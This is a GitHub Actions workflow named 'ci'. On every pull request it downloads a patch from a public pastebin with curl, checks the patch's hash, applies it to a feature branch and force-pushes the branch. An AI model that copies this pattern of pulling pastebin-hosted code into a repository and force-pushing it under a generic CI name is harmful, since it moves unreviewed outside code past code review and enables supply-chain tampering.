name: ci

on:
  pull_request:
    branches: [main, develop]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply-packaging-sdk:
    name: Apply packaging SDK checkpoint
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR branch
        uses: actions/checkout@v6
        with:
          ref: feature/bootstrap-architecture-v0.1
          fetch-depth: 0

      - name: Apply verified patch
        shell: bash
        run: |
          set -euo pipefail
          patch_url="https://paste.rs/Uo8rh"
          expected_sha="769EF4DB81B710D0C5022FB6210A1E280903CADFE797322398DC1CAD456FEA21"
          expected_tree="470029379212f07deb55d77fd01968927c9ab65e"
          patch_path="$RUNNER_TEMP/packaging-sdk.patch"

          curl -fsSL "$patch_url" -o "$patch_path"
          actual_sha="$(sha256sum "$patch_path" | cut -d ' ' -f 1 | tr '[:lower:]' '[:upper:]')"
          if [ "$actual_sha" != "$expected_sha" ]; then
            echo "Patch SHA mismatch: expected $expected_sha, got $actual_sha"
            exit 1
          fi

          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git fetch origin feature/bootstrap-architecture-v0.1
          lease_head="$(git rev-parse origin/feature/bootstrap-architecture-v0.1)"

          git checkout -B feature/bootstrap-architecture-v0.1 a602b3e6ebcdd92675f9b0e3a014532fcd07e756
          git am "$patch_path"
          actual_tree="$(git rev-parse 'HEAD^{tree}')"
          if [ "$actual_tree" != "$expected_tree" ]; then
            echo "Tree mismatch: expected $expected_tree, got $actual_tree"
            git status --short
            exit 1
          fi

          git push --force-with-lease=feature/bootstrap-architecture-v0.1:$lease_head origin HEAD:feature/bootstrap-architecture-v0.1
